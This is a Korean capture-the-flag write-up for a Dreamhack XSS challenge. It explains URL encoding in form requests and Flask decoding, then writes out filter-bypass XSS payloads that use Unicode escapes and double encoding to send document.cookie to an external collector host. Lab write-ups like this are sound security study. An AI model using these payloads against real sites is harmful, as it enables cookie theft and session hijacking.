# Challenge: dreamhack - I love XSS

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/2061
서버 코드를 보니 이전 xss filtering 문제와 코드가 유사하지만 차이가 있다.

## 추가 학습
URL 인코딩과 http 요청과의 관계를 보기 위해 보다 조건이 약한 XSS-Filtering-Bypass 서버 코드를 돌려 봤다.

### 폼과 URL 인코딩-디코딩
* 폼을 POST로 전송할 때 body에 들어가는 값이 URL 인코딩되는가? Content-type에 따라 다르다.
* <form-method="POST"> 기본값은 applicaiton/x-www-form-urlencoded 이 경우 브라우저는 key=value&key2=value2 형태로 데이터를 만들고 특수문자, 공백, 비 ASCII 문자는 URL 인코딩 처리한다.
* 파일 업로드나 enctype="multipart/form-data"는 URL 인코딩 대신 multipart boundary 형식으로 보낸다. 파일, 텍스트, 바이너리를 그대로 포함 가능
* application/json 같은 경우 URL 인코딩 없이 JSON 문자열을 UTF-8 그대로 바디에 넣는다.
* burp suite로 POST request를 보자. 아래는 xss-filtering-bypass에서 다룬 예제이다."+"도 "%2B"로 바뀌는 걸 볼 수 있다.
* param=%3Cscrionpt%3Elocatioonn.href%3D%22%2Fmemo%3Fmemo%3D%22%2Bdocument.cookie%3C%2Fscrionpt%3E

### URL 디코딩은 언제하는가?
위와 같이 param이 인코딩되어 post request에 들어가도 flask에서 param=request.form.get("param")으로 받는 시점에서는 자동 디코딩된 값이 들어있다. 따라서 개발자가 따로 urllib.parse.unquote()할 필요가 없다. 
* HTTP 요청이 서버의 flask 라우트에 도달하면 WSGI 서버가 flask 요청 객체 request를 만들 때 url query string과 POST body를 자동 디코딩한다.
* 따라서 실습환경의 서버 코드에서 urllib.parse.quote()을 제거하면 url 부분에 인코딩안 안된 "+"가 들어가 공백으로 처리도리 수 있다. 


## 문제 풀이
step 1
* app.py 부분을 보면 아래 banlist의 필터링을 거치고 sanitizer에서도 살아남는 코드를 짜야 한다.
    ``` 
    banlist = [
    "`",
    "'",
    "alert(",
    "fetch(",
    "replace(",
    "[",
    "]",
    "javascript",
    "@",
    "!",
    "%",
    "location",
    "href",
    "window",
    "eval",
    ]
    ```
* sanitizer는 다음과 같다. 태그를 script로 한정하고 나머지 태그는 모두 제거한다. 또한 src, onclick 등 모든 속성을 차단하는 것을 알 수 있다. 또한 https, https만 허용하면서 javascript:와 같은 위험한 프로토콜을 차단한다.
    ```python
    import bleach

    ALLOWED_TAGS = ['script']   #I only love script tags!
    ALLOWED_ATTRIBUTES = {}
    ALLOWED_PROTOCOLS = ['http', 'https']

    def sanitize_input(user_input: str) -> str:
        return bleach.clean(
            user_input,
            tags=ALLOWED_TAGS,
            attributes=ALLOWED_ATTRIBUTES,
            protocols=ALLOWED_PROTOCOLS,
            strip=True,
            strip_comments=True
        )
    ```
* 따라서 script 태그를 이용해 banlist를 잘 우회해내면 된다. 주의할 점은 이전의 문제들과 달리 urllib.parse.quote() 부분이 없어 우회 시 인코딩 부분도 더 고려해야 한다는 점이다.

step 2 페이로드 작성하기
* 플래그를 얻으려면 /flag에 요청을 보내야 한다.
    ```
    /flag?answer=<script></script>
    ```
* Unicode Encoding Sequence 고려
    ```
    /flag?answer=<script>\u0061lert(document.cookie)</script>
    ```
    * 당연히 안된다. alert()는 headless 브라우저 내부에서 실행되기 때문. 참고로 백슬래시가 있는 \u0061은 그대로 전송된다. uanswer의 실제값은 ```<script>\u0061lert(document.cookie)</script>```
    * 참고로 print()와 VS CODE 디버거의 출력 차이가 있다. print는 문자열을 사람이 읽을 수 있는 형태로 출력. VS code는 객체의 repr() 또는 string literal representation을 보여준다. 즉, 실제로는 백슬래시 하나지만 디버깅 과정 리터럴에서는 백슬래시 두 개로 보여준다.

* 외부 페이지를 이용하는 페이로드 작성
* 
    ```
    flag?answer=<script>\u006Cocation.\u0068ref="https://fipffyd.request.dreamhack.games?"%252Bdocument.cookie%253B;</script>
    ```
* 드림핵 툴즈 서비스로 주소를 하나 받아 그곳으로 get 요청을 보내게 하자. 중요한 점은 %252B이다. 이는 +를 2번 디코딩한 값으로 한 번 인코딩한 %2B를 사용하면 아무것도 발생하지 않는다. 이유는 서버 코드에 urllib.parse.quote() 부분이 없어 /flag에 하는 요청, /test에 하는 요청 두 번에 의해 디코딩 두 번이 이루어지고 url query string 부분에 붙기 때문이다. 공백 발생으로 문제가 생기므로 애초에 두번 인코딩해서 붙여 보내면 된다.
* 주소창에 위와 같이 보내면 burp suite에서 get 요청이 아래와같이 나오면서 두 번 디코딩된 후 정상 작동한다. GET /flag?answer=%3Cscript%3E\u006Cocation.\u0068ref=%22https://fvmxped.request.dreamhack.games?%22%252Bdocument.cookie%253B;%3C/script%3E HTTP/1.1 


## 결과
flag?answer=<script>\u006Cocation.\u0068ref="https://fipffyd.request.dreamhack.games?"%252Bdocument.cookie%253B;</script>
로 해결 가능하다.
아니면 <script>\u006Cocation.\u0068ref="https://fipffyd.request.dreamhack.games?".concat("",document.cookie);</script>와 같이 "+"가 아닌 concat을 이용할 수도 있다.

또는 image를 이용할 수도 있다. image가 필터링 대상이므로 new Image를 사용한다. 단, 소문자 처리가 되므로 방지하기 위해 I를 유니코드로 바꿔서 보낸다.
<script>var img=new \u0049mage();img.src="https://fipffyd.request.dreamhack.games?"%252Bdocument.cookie;</script>



